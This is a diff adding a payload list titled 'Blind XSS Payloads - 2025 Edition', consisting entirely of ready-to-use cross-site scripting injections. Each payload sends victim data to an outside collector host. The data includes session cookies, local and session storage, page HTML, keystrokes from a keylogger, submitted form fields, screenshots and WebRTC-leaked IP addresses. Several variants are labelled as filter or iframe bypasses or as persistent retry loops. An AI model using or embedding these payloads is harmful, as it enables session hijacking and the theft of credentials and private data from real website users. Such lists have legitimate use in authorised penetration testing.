@@ -1,0 +1,142 @@
+# Blind XSS Payloads - 2025 Edition
+
+# Basic callbacks with fetch API
+<script>fetch('https://xss.report/c/UNIQUE_ID')</script>
+<script>fetch('https://xss.report/c/UNIQUE_ID?cookie='+document.cookie)</script>
+<script>fetch('https://xss.report/c/UNIQUE_ID?'+new URLSearchParams({d:document.domain,l:location.href,c:document.cookie}))</script>
+<script>fetch('https://xss.report/c/UNIQUE_ID', {method:'POST',body:JSON.stringify({url:location.href,cookies:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage})})</script>
+
+# Callbacks with Beacon API (more reliable)
+<script>navigator.sendBeacon('https://xss.report/c/UNIQUE_ID',document.cookie)</script>
+<script>navigator.sendBeacon('https://xss.report/c/UNIQUE_ID',JSON.stringify({url:location.href,cookies:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage}))</script>
+
+# Image-based callbacks (for environments where script is blocked)
+<img src=x onerror="this.src='https://xss.report/c/UNIQUE_ID?'+document.cookie;this.removeAttribute('onerror');">
+<img src="https://xss.report/c/UNIQUE_ID?cookie='+document.cookie" style="display:none">
+
+# Delayed execution (bypasses some filters)
+<script>setTimeout(function(){fetch('https://xss.report/c/UNIQUE_ID?c='+document.cookie)},3000)</script>
+<script>setTimeout(function(){navigator.sendBeacon('https://xss.report/c/UNIQUE_ID',document.cookie)},5000)</script>
+
+# DOM data exfiltration
+<script>
+fetch('https://xss.report/c/UNIQUE_ID', {
+  method: 'POST',
+  body: JSON.stringify({
+    url: location.href,
+    cookies: document.cookie,
+    dom: document.documentElement.outerHTML.substring(0, 5000),
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage)
+  })
+})
+</script>
+
+# WebSocket callbacks
+<script>
+var ws = new WebSocket('wss://xss.report/ws/UNIQUE_ID');
+ws.onopen = function() {
+  ws.send(JSON.stringify({
+    url: location.href,
+    cookies: document.cookie,
+    localStorage: JSON.stringify(localStorage)
+  }));
+  ws.close();
+};
+</script>
+
+# Persistent callbacks (keeps trying if network is down)
+<script>
+function exfil() {
+  try {
+    fetch('https://xss.report/c/UNIQUE_ID?c='+document.cookie).catch(e => {
+      setTimeout(exfil, 10000); // retry after 10 seconds
+    });
+  } catch(e) {
+    setTimeout(exfil, 10000); // retry after 10 seconds
+  }
+}
+exfil();
+</script>
+
+# Iframe isolation bypass
+<script>
+try {
+  let data = {
+    url: location.href,
+    topUrl: top.location.href,
+    parentUrl: parent.location.href,
+    cookies: document.cookie,
+    topCookies: top.document.cookie,
+    parentCookies: parent.document.cookie
+  };
+  fetch('https://xss.report/c/UNIQUE_ID', {method:'POST', body:JSON.stringify(data)});
+} catch(e) {
+  fetch('https://xss.report/c/UNIQUE_ID?error='+encodeURIComponent(e.message));
+}
+</script>
+
+# Keylogger
+<script>
+var keys = '';
+document.addEventListener('keydown', function(e) {
+  keys += e.key;
+  if(keys.length > 50) {
+    fetch('https://xss.report/c/UNIQUE_ID?k='+encodeURIComponent(keys));
+    keys = '';
+  }
+});
+</script>
+
+# Form stealer
+<script>
+document.addEventListener('submit', function(e) {
+  var data = {};
+  for(var i=0; i<e.target.elements.length; i++) {
+    var el = e.target.elements[i];
+    if(el.name) data[el.name] = el.value;
+  }
+  navigator.sendBeacon('https://xss.report/c/UNIQUE_ID', JSON.stringify(data));
+});
+</script>
+
+# Session hijacking with cookie exfiltration
+<script>
+document.cookie.split(';').forEach(function(cookie) {
+  fetch('https://xss.report/c/UNIQUE_ID?cookie='+encodeURIComponent(cookie.trim()));
+});
+</script>
+
+# Advanced session hijacking with cookie monitoring
+<script>
+var initialCookies = document.cookie;
+setInterval(function() {
+  if(document.cookie != initialCookies) {
+    fetch('https://xss.report/c/UNIQUE_ID?newCookie='+encodeURIComponent(document.cookie));
+    initialCookies = document.cookie;
+  }
+}, 5000);
+</script>
+
+# Screenshot capability (HTML Canvas)
+<script>
+html2canvas(document.body).then(canvas => {
+  fetch('https://xss.report/c/UNIQUE_ID', {
+    method: 'POST',
+    body: canvas.toDataURL()
+  });
+});
+</script>
+
+# WebRTC IP leak
+<script>
+var rtc = new RTCPeerConnection({iceServers:[]});
+rtc.createDataChannel('');
+rtc.onicecandidate = e => {
+  if(e.candidate) {
+    var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+    if(ip) fetch('https://xss.report/c/UNIQUE_ID?ip='+ip[1]);
+  }
+};
+rtc.createOffer().then(o => rtc.setLocalDescription(o));
+</script>
